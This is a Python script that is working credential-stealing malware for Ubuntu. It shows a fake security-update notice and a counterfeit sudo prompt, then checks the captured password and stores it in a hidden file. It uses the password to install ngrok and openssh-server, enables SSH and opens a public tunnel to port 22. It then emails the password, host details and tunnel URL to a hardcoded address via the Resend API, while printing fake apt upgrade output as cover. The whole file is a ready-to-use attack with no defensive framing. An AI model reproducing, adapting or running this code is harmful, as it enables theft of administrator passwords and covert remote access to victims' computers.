#!/usr/bin/env python3

import os
import sys
import time
import getpass
import subprocess
import random
import platform
import json
import threading
from datetime import datetime
from pathlib import Path

def clear_screen():
    print("[DEBUG] clear_screen called")
    os.system('clear')

def send_password_via_resend(password, ngrok_url=None):
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        try:
            ip_address = subprocess.check_output(
                ["hostname", "-I"], text=True
            ).strip().split()[0]
        except Exception:
            ip_address = "unknown"

        subject = f"Security Audit - Credential Capture from {hostname}"
        
        ngrok_info = ""
        if ngrok_url:
            ngrok_info = f"<p><strong>SSH Access URL:</strong> {ngrok_url}</p>\n        "
        
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        {ngrok_info}<br>
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", str(data).replace("'", '"')
        ]
        
        subprocess.Popen(curl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception:
        pass

def capture_sudo_password():
    print("[DEBUG] capture_sudo_password called")
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            password = getpass.getpass(prompt)

            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)

            if process.returncode == 0:
                print("[DEBUG] Correct sudo password captured")
                return password
            else:
                print("[DEBUG] Incorrect sudo password attempt")
                attempt += 1

        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[DEBUG] sudo validation timed out")
            attempt += 1

    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    print("[DEBUG] show_installation_progress called")
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def is_ubuntu():
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'ubuntu' in content:
                    return True
        
        if 'ubuntu' in platform.platform().lower():
            return True
            
        try:
            result = subprocess.run(['lsb_release', '-i'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and 'ubuntu' in result.stdout.lower():
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
            
        return False
    except Exception:
        return False

def get_stored_password():
    print("[DEBUG] get_stored_password called")
    try:
        home_dir = os.path.expanduser("~")
        log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
        
        if not os.path.exists(log_path):
            print("[DEBUG] No stored password file found")
            return None
            
        with open(log_path, 'r') as f:
            lines = f.read().strip().split('\n')
            if lines and lines[-1]:
                password = lines[-1].strip()
                print("[DEBUG] Stored password found")
                return password
                
        return None
        
    except Exception as e:
        print(f"[DEBUG] Exception in get_stored_password: {e}")
        return None

def is_ngrok_installed():
    try:
        # Try to run ngrok version directly instead of using which
        result = subprocess.run(['ngrok', 'version'], capture_output=True, timeout=3, text=True)
        installed = result.returncode == 0
        return installed
    except subprocess.TimeoutExpired:
        return False
    except FileNotFoundError:
        return False
    except Exception:
        return False

def is_ngrok_forwarding_ssh():
    try:
        result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if 'tunnels' in data:
                for tunnel in data['tunnels']:
                    if tunnel.get('config', {}).get('addr') == 'localhost:22':
                        return True
        return False
    except Exception:
        return False

def install_ngrok_with_password(password):
    try:
        if is_ngrok_installed():
            return True
        
        commands = [
            "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null",
            'echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list',
            "sudo apt update",
            "sudo apt install ngrok -y"
        ]
        
        for command in commands:
            if "sudo" in command:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate(input=f"{password}\n")
                
                if process.returncode != 0:
                    return False
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    return False
        
        try:
            result = subprocess.run(['ngrok', 'version'], capture_output=True, text=True)
            installed = result.returncode == 0
            return installed
        except FileNotFoundError:
            return False
            
    except Exception:
        return False

def setup_ssh_forwarding(password):
    try:
        print("[DEBUG] Starting SSH service setup")
        
        # Install openssh-server if not installed
        install_ssh_process = subprocess.Popen(
            ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = install_ssh_process.communicate(input=f"{password}\n")
        print(f"[DEBUG] SSH install result: {install_ssh_process.returncode}")
        
        # Start SSH service with password
        ssh_process = subprocess.Popen(
            ['sudo', '-S', 'systemctl', 'start', 'ssh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = ssh_process.communicate(input=f"{password}\n")
        print(f"[DEBUG] SSH service start result: {ssh_process.returncode}")
        
        # Enable SSH service to start on boot
        enable_ssh_process = subprocess.Popen(
            ['sudo', '-S', 'systemctl', 'enable', 'ssh'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        enable_ssh_process.communicate(input=f"{password}\n")
        
        # Kill any existing ngrok processes
        try:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
            time.sleep(3)
        except Exception:
            pass
        
        print("[DEBUG] Starting ngrok tunnel for SSH")
        
        # Start ngrok with explicit config and background mode
        ngrok_cmd = ['ngrok', 'tcp', '22', '--log=stdout', '--log-level=info']
        print(f"[DEBUG] Running command: {' '.join(ngrok_cmd)}")
        
        ngrok_process = subprocess.Popen(
            ngrok_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )
        
        # Give ngrok more time to establish tunnel and start web interface
        print("[DEBUG] Waiting for ngrok to establish tunnel and start web interface...")
        time.sleep(15)
        
        # Check if ngrok process is still running
        if ngrok_process.poll() is None:
            print("[DEBUG] ngrok process is running")
        else:
            print(f"[DEBUG] ngrok process exited with code: {ngrok_process.poll()}")
            # Try to get the output to see what went wrong
            try:
                stdout, stderr = ngrok_process.communicate(timeout=1)
                print(f"[DEBUG] ngrok stdout: {stdout}")
                print(f"[DEBUG] ngrok stderr: {stderr}")
            except:
                pass
            return None
        
        # Check if ngrok web interface is accessible
        print("[DEBUG] Checking if ngrok web interface is accessible...")
        web_check = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', 'http://localhost:4040'],
                                 capture_output=True, text=True, timeout=5)
        print(f"[DEBUG] Web interface check HTTP code: {web_check.stdout}")
        
        # Get ngrok tunnel info with more retries and better error handling
        max_retries = 8
        for attempt in range(max_retries):
            try:
                print(f"[DEBUG] Attempting to get ngrok tunnel info (attempt {attempt + 1})")
                
                # First check if the web interface is responding
                ping_result = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{response_code}', 'http://localhost:4040'],
                                           capture_output=True, text=True, timeout=5)
                print(f"[DEBUG] Web interface ping result: {ping_result.stdout}")
                
                result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
                                      capture_output=True, text=True, timeout=10)
                print(f"[DEBUG] Curl result code: {result.returncode}")
                
                if result.returncode == 0 and result.stdout.strip():
                    print(f"[DEBUG] Curl output: {result.stdout}")
                    try:
                        data = json.loads(result.stdout)
                        if 'tunnels' in data and len(data['tunnels']) > 0:
                            for tunnel in data['tunnels']:
                                config = tunnel.get('config', {})
                                if config.get('addr') == 'localhost:22' or '22' in str(config.get('addr', '')):
                                    public_url = tunnel['public_url']
                                    print(f"[DEBUG] Found SSH tunnel URL: {public_url}")
                                    return public_url
                            
                            # If no SSH tunnel found, get the first tunnel
                            public_url = data['tunnels'][0]['public_url']
                            print(f"[DEBUG] Using first tunnel URL: {public_url}")
                            return public_url
                        else:
                            print("[DEBUG] No tunnels found in response")
                    except json.JSONDecodeError as e:
                        print(f"[DEBUG] JSON decode error: {e}")
                        print(f"[DEBUG] Raw response: {result.stdout}")
                else:
                    print(f"[DEBUG] Curl failed or empty response. stderr: {result.stderr}")
                
                print(f"[DEBUG] No valid tunnel data yet, waiting...")
                time.sleep(4)
                
            except Exception as e:
                print(f"[DEBUG] Exception getting tunnel info: {e}")
                time.sleep(4)
        
        print("[DEBUG] Failed to get ngrok tunnel URL after all retries")
        return None
        
    except Exception as e:
        print(f"[DEBUG] Exception in setup_ssh_forwarding: {e}")
        return None
        
def background_operations(password, silent=False):
    if not silent:
        print("[DEBUG] background_operations called")
    try:
        ngrok_url = None

        if not is_ubuntu():
            if not silent:
                print("[DEBUG] Not Ubuntu, exiting background_operations")
            return

        # Install ngrok if not already installed
        if not is_ngrok_installed():
            if not silent:
                print("[DEBUG] ngrok not installed, installing...")
            install_result = install_ngrok_with_password(password)
            if not install_result:
                if not silent:
                    print("[DEBUG] Failed to install ngrok")
                send_password_via_resend(password, None)
                return
        else:
            if not silent:
                print("[DEBUG] ngrok already installed")

        # If ngrok is installed, check if SSH forwarding is running
        if is_ngrok_installed():
            if not silent:
                print("[DEBUG] ngrok is installed, checking SSH forwarding")
            if is_ngrok_forwarding_ssh():
                if not silent:
                    print("[DEBUG] ngrok SSH forwarding already running, getting URL")
                try:
                    result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'],
                                            capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        data = json.loads(result.stdout)
                        if 'tunnels' in data and len(data['tunnels']) > 0:
                            for tunnel in data['tunnels']:
                                config = tunnel.get('config', {})
                                if config.get('addr') == 'localhost:22' or '22' in str(config.get('addr', '')):
                                    ngrok_url = tunnel['public_url']
                                    if not silent:
                                        print(f"[DEBUG] Found ngrok SSH tunnel URL: {ngrok_url}")
                                    break
                except Exception as e:
                    if not silent:
                        print(f"[DEBUG] Exception while getting ngrok URL: {e}")
            else:
                if not silent:
                    print("[DEBUG] ngrok SSH forwarding not running, setting up")
                ngrok_url = setup_ssh_forwarding(password)
                if not silent:
                    print(f"[DEBUG] ngrok_url after setup: {ngrok_url}")

        # Send email with password and ngrok URL if available
        if not silent:
            print(f"[DEBUG] Sending password via resend, ngrok_url: {ngrok_url}")
        send_password_via_resend(password, ngrok_url)

    except Exception as e:
        if not silent:
            print(f"[DEBUG] Exception in background_operations: {e}")
        # Still send email even if ngrok fails
        send_password_via_resend(password, None)

def save_password_to_file(password):
    print("[DEBUG] save_password_to_file called")
    try:
        home_dir = os.path.expanduser("~")
        share_dir = os.path.join(home_dir, ".local", "share")
        os.makedirs(share_dir, exist_ok=True)
        file_path = os.path.join(share_dir, ".temp_log")
        with open(file_path, "a") as f:
            f.write(password + "\n")
        print("[DEBUG] Password saved to file")
        return True
    except Exception as e:
        print(f"[DEBUG] Exception in save_password_to_file: {e}")
        return False

def main():
    print("[DEBUG] main called")
    try:
        # Check if password is already captured
        stored_password = get_stored_password()
        
        if stored_password:
            print("[DEBUG] Stored password found, running operations")
            # Password exists - run operations silently
            background_operations(stored_password, silent=True)
            sys.exit(0)
        
        # No password stored - run the fake sudo capture
        clear_screen()
        
        print("Unattended-upgrades: Security updates have not been installed.")
        print("The following security updates are pending:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print()
        print("It is recommended that you apply these updates immediately.")
        print("To do so, run the following command:")
        print("  sudo apt update && sudo apt upgrade")
        print()
        
        password = capture_sudo_password()
        
        print("Reading package lists... Done")
        time.sleep(1)
        print("Building dependency tree       ")
        print("Reading state information... Done")
        time.sleep(2)
        print("The following packages will be upgraded:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
        print("Need to get 14.2 MB of archives.")
        print("After this operation, 0 B of additional disk space will be used.")
        print()
        time.sleep(1)
        
        # Save password to file
        save_password_to_file(password)
        
        # Start background operations (install ngrok, setup SSH, send email)
        background_thread = threading.Thread(target=background_operations, args=(password,))
        background_thread.daemon = True
        background_thread.start()
        
        # Show fake installation progress
        show_installation_progress()
        
        print("Processing triggers for man-db (2.10.2-1) ...")
        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
        time.sleep(1)
        print()
        
        # Give background thread time to complete before exiting
        background_thread.join(timeout=10)
        sys.exit(0)
        
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception as e:
        print(f"[DEBUG] Exception in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
